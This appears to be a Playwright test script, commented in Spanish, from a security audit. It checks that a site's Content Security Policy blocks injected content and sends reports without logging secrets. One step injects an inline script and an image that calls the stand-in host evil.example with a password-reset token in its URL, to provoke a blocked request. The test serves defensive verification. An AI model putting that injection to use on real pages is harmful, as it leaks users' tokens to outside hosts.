// Reportes de CSP en un navegador real (B-7, auditoría 07/11/2026). Solo lectura del sitio: no envía formularios ni credenciales.
// Parte 1: navegación normal, debe dar 0 reportes y 0 violaciones. Parte 2: provoca un script inline y una imagen bloqueados con tokens en la URL;
// debe llegar un reporte por cada bloqueo y el log no debe contener los tokens. Ver resultados_reportes_csp.txt.
// Uso: node reportes.cjs BASE_URL
const { chromium } = require('playwright');
const BASE = process.argv[2] || 'http://127.0.0.1:8080';
const PAGINAS = ['/', '/login', '/registro', '/ayuda', '/caracteristicas', '/privacidad', '/consejos', '/plataforma/login',
  '/recuperar-contrasena', '/app/inicio', '/ruta-que-no-existe'];

(async () => {
  const navegador = await chromium.launch({ args: ['--no-sandbox'] });
  // 1) Navegación normal: ninguna violación ni reporte.
  const contexto = await navegador.newContext();
  const pagina = await contexto.newPage();
  let reportesNormales = 0;
  let violacionesConsola = [];
  pagina.on('request', (r) => { if (r.url().includes('/api/v1/security/csp-report')) reportesNormales++; });
  pagina.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violacionesConsola.push(m.text().slice(0, 140)); });
  for (const ruta of PAGINAS) {
    await pagina.goto(BASE + ruta, { waitUntil: 'networkidle' }).catch(() => {});
    await pagina.waitForTimeout(500);
  }
  await pagina.waitForTimeout(2000);
  console.log(JSON.stringify({ parte: 'navegacion_normal', paginas: PAGINAS.length, reportesEnviados: reportesNormales, violacionesConsola: violacionesConsola.length, ejemplos: violacionesConsola.slice(0, 2) }));

  // 2) Violación real: script inline y una imagen de un host ajeno, con un token en la URL de la pantalla y del recurso.
  await pagina.goto(BASE + '/restablecer-contrasena?token=SECRETO123#CLAVE-ABC', { waitUntil: 'networkidle' });
  const antes = reportesNormales;
  await pagina.evaluate(() => {
    const s = document.createElement('script');
    s.textContent = 'window.__ejecutado = true;';
    document.body.appendChild(s);
    const img = document.createElement('img');
    img.src = 'https://evil.example/pixel.png?token=CLAVE-ABC';
    document.body.appendChild(img);
  });
  await pagina.waitForTimeout(3000);
  console.log(JSON.stringify({ parte: 'violacion_provocada', reportesEnviados: reportesNormales - antes, ejecutoElScript: await pagina.evaluate(() => window.__ejecutado === true) }));
  await navegador.close();
})().catch((e) => { console.error('ERROR', e.message); process.exit(2); });
